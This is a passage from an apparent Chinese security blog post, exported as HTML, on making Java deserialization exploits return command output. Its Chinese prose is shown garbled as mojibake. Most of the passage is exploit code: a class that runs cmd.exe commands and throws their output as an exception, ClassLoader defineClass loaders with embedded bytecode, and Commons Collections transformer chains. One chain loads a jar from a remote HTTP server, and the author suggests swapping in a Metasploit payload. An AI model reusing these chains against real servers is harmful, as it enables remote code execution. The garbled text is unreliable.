class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">52</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// åªå¤„ç†Summerç±»</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨JVMçš„defineClassæ–¹æ³•å®šä¹‰Summerç±»</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨</span></span><br><span class="line">        demo2 loader = <span class="keyword">new</span> demo2();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨åŠ è½½TestHelloWorldç±»</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line">            <span class="comment">// åå°„åˆ›å»ºSummerç±»ï¼Œç­‰ä»·äº Summer t = new Summer(â€˜ipconfig);</span></span><br><span class="line">            testClass.getConstructor(String.class).newInstance("ipconfig");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Summerç±»ä»£ç ï¼Œè¿™é‡Œæ˜¯å°†å›æ˜¾ç»“æœä½¿ç”¨å¼‚å¸¸ç±»æŠ›å‡ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Summer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Summer</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InputStream stream = (<span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader streamReader = <span class="keyword">new</span> InputStreamReader(stream, Charset.forName(<span class="string">"gbk"</span>));</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(streamReader);</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605102043439.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><p>&emsp;&emsp; å·¥å…·ç±»å°†<code>.class</code>å­—èŠ‚ç æ–‡ä»¶è½¬åŒ–æˆå­—èŠ‚æ•°ç»„ï¼Œå¯ä»¥æ·»åŠ è‡ªå®šä¹‰æ”¹é€ æˆé€‚åˆè‡ªå·±æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FiletoBytes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FiletoBytes</span><span class="params">(String file_name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   ä¿®æ”¹å†…å®¹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    åªéœ€è¦ä¼ å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å°±å¯ä»¥è¿›è¡Œè½¬åŒ–</span></span><br><span class="line"><span class="comment">     *  éœ€è¦æ ¹æ®æ–‡ä»¶å¤§å°ä¿®æ”¹byteså¤§å°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename )</span></span>&#123;</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 20m</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   ä¿®æ”¹å†…å®¹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    byteså¤§å°éœ€è¦ä¼ å…¥è®¾ç½®</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename ,<span class="keyword">byte</span>[] bytes)</span></span>&#123;</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•ä½¿ç”¨demoï¼Œå°†Summer.classæ–‡ä»¶è½¬åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summer.classçš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    <span class="comment">// E:\Soures\JavaLearnVulnerability\Summer.classè‡ªè¡Œä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String file_name = <span class="string">"E:"</span> + File.separator + <span class="string">"Soures"</span> + File.separator + <span class="string">"JavaLearnVulnerability"</span> + File.separator + <span class="string">"Summer.class"</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1600</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        FiletoBytes filetoBytes = <span class="keyword">new</span> FiletoBytes(file_name);</span><br><span class="line"><span class="comment">//        System.out.println("ç›´æ¥ä¼ å…¥æ–‡ä»¶ï¼Œé»˜è®¤byteså¤§å°é»˜è®¤ä¸º4kb");</span></span><br><span class="line"><span class="comment">//        System.out.println(filetoBytes.FiletoBytes(file_name));</span></span><br><span class="line">        System.out.println(<span class="string">"ä¼ å…¥æ–‡ä»¶å’Œbytes"</span>);</span><br><span class="line">        System.out.println(filetoBytes.FiletoBytes(file_name,bytes));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ¸©é¦¨æç¤ºï¼šåœ¨è½¬æ–‡ä»¶çš„æ—¶å€™æœ€å¥½å…ˆçœ‹çœ‹æ–‡ä»¶å¤§å°ï¼Œä¼ å…¥åˆé€‚çš„æ•°ç»„å¤§å°ã€‚å› ä¸ºåé¢è¿™äº›å¤šä½™å‡º0è¦åˆ é™¤ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚<br><img src="https://img-blog.csdnimg.cn/2020060510594243.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></blockquote><hr><h2 id="defineclassâ€™s-demo"><a href="#defineclassâ€™s-demo" class="headerlink" title="defineclassâ€™s demo"></a>defineclassâ€™s demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String classname = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// éƒ¨åˆ†å­—èŠ‚ç ï¼Œå®Œæ•´è·å–githubã€‚</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨åå°„çš„æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        defineclass defineclass = <span class="keyword">new</span> defineclass();</span><br><span class="line">        Class cls = defineclass.defineClass(classname,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance("whoami");</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605110551596.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="ccdefineclass"><a href="#ccdefineclass" class="headerlink" title="ccdefineclass"></a>ccdefineclass</h2><p>&emsp;&emsp; æ”¹å†™ccé“¾ï¼Œæ¥è¾¾åˆ°è·å–å›æ˜¾ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå‘ï¼ŒJDKè‡ªå¸¦<code>java.lang.ClassLoader</code>ç±»ä¸‹çš„defineclassæ˜¯æƒé™æ˜¯<code>protected</code>ä¸èƒ½ç›´æ¥é€šè¿‡åå°„è°ƒç”¨ï¼Œæ•…ä¸é¡¾è™‘ä½¿ç”¨è¿™ä¸ªç±»ï¼Œç¬”è€…ä½¿ç”¨çš„æ˜¯weblogicä¸­çš„<code>wlfullclient.jar!.org.mozilla.classfile.DefiningClassLoader</code>ã€‚<br>ç¬”è€…è¿™é‡Œåªç»™å‡ºéƒ¨åˆ†å®ç°ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="comment">//                new ConstantTransformer(ClassLoader.class),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class,byte[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"summer.classload.Summer"</span>,bytes&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"Exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"ipconfig"&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="URLClassLoaderè¿œç¨‹åŠ è½½æ–‡ä»¶å›æ˜¾"><a href="#URLClassLoaderè¿œç¨‹åŠ è½½æ–‡ä»¶å›æ˜¾" class="headerlink" title="URLClassLoaderè¿œç¨‹åŠ è½½æ–‡ä»¶å›æ˜¾"></a>URLClassLoaderè¿œç¨‹åŠ è½½æ–‡ä»¶å›æ˜¾</h1><p>&emsp;&emsp; URLClassLoaderæ˜¯<code>java.net</code>ä¸‹çš„ç±»ï¼Œç»§æ‰¿äº†<code>java.lang.Classloader</code>ç±»å¯¹è±¡ã€‚URLClassLoaderå¯ä»¥ä»è¿œç«¯æˆ–è€…æœ¬åœ°åŠ è½½jar/classæ–‡ä»¶ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200605154823661.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="URLClassLoaderâ€™s-Demo"><a href="#URLClassLoaderâ€™s-Demo" class="headerlink" title="URLClassLoaderâ€™s Demo"></a>URLClassLoaderâ€™s Demo</h2><ol><li>ç¼–å†™expä»£ç ï¼Œä»£ç å·²ç»ä¸Šä¼ è‡³GitHubé¡¹ç›®ä¸­ã€‚</li><li>ç¼–è¯‘<code>javac Summer.java</code></li><li>åˆ›å»ºhttpæœåŠ¡ <code>py -2 -m SimpleHTTPServer  8090</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1:8090/summer.jar"</span>);</span><br><span class="line"><span class="comment">//        URL url = new URL("file:e:/summer.jar");</span></span><br><span class="line"></span><br><span class="line">        URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class cls = ucl.loadClass(<span class="string">"Summer"</span>);</span><br><span class="line">        Method m = cls.getMethod(<span class="string">"Exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">"ipconfig"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605160339489.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200605170754423.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="CCURLClassLoader"><a href="#CCURLClassLoader" class="headerlink" title="CCURLClassLoader"></a>CCURLClassLoader</h2><p>&emsp;&emsp; åŒæ ·ä½¿ç”¨ccé“¾æ¥æ”¹é€ æ­¤å›æ˜¾æ–¹æ³•ï¼Œ<code>è¯•æƒ³ä¸€ä¸‹æŠŠè¿™ä¸ªjaræ¢æˆmsfçš„payloadå¯ä»¥è¾¾åˆ°ä»€ä¹ˆæ•ˆæœå‘¢ï¼Ÿ</code>è¿™é‡Œæˆ‘ä¸å®ç°ï¼Œè‡ªå·±å¯ä»¥å»è„‘æ´å®ç°ä¸€ä¸‹ï¼Œå¾ˆç®€å•çš„ï¼Œæˆ‘ç›¸ä¿¡çœ‹è¿‡æˆ‘æ–‡ç« çš„äººéƒ½åº”è¯¥ä¼šã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(URLClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[]&#123;URL[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Object[]&#123;new URL[]&#123;new URL("http://127.0.0.1:8090/summer.jar")&#125;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"loadClass"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"summer"&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getConstructor"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[]&#123;String.class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new String[]&#123;"ipconfig"&#125;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>&emsp;&emsp; ç¬”è€…è¿™é‡Œæ€»ç»“éƒ½æ˜¯ä»¥CCé“¾ä¸ºæ”¹é€ åŸºç¡€ï¼Œå…¶å®CCè¿˜æœ‰å¾ˆå¤šç©æ³•ï¼Œå¤§å®¶å¯ä»¥è„‘æ´ä¸€ä¸‹ï¼ŒJavaååºåˆ—åŒ–å›æ˜¾ä¹Ÿä¸æ­¢æœ¬æ–‡ä¸­ä¸¤ç§ï¼Œæ¯”ä¾‹è¯´RMIã€weblogicçš„T3åè®®ã€‚å­¦ä¹ æ— æ­¢å¢ƒï¼ŒåŠªåŠ›å°±å®Œäº‹ã€‚</p><p><code>äºæ— å¸¸å¤„çŸ¥æœ‰æƒ…ï¼Œäºæœ‰æƒ…å¤„çŸ¥ä¼—ç”Ÿ..........</code></p><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://javasec.org/javase/ClassLoader/" target="_blank" rel="noopener">https://javasec.org/javase/ClassLoader/</a><br><a href="https://xz.aliyun.com/t/7740" target="_blank" rel="noopener">https://xz.aliyun.com/t/7740</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;é¢˜å¤–è¯&quot;&gt;&lt;a href=&quot;#é¢˜å¤–è¯&quot; class=&quot;headerlink&quot; title=&quot;é¢˜å¤–è¯&quot;&gt;&lt;/a&gt;é¢˜å¤–è¯&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; è¿™æ˜¯ä¸€ç¯‡æœ¬åº”è¯¥æ—©å°±å®Œæˆçš„æ–‡ç« ï¼Œä½†æ˜¯ç”±äºå„ç§åŸå› æ‹–å»¶è‡³æ­¤ã€‚ä¹‹å‰æœ‰è¯»è€…å°±å‚¬æˆ‘ï¼Œä½†æ˜¯å®åœ¨æ˜¯å„ç§äº‹æƒ…ç¼ èº«ï¼ŒåŠ ä¸Šè‡ªå·±
      
    
    </summary>
    
    
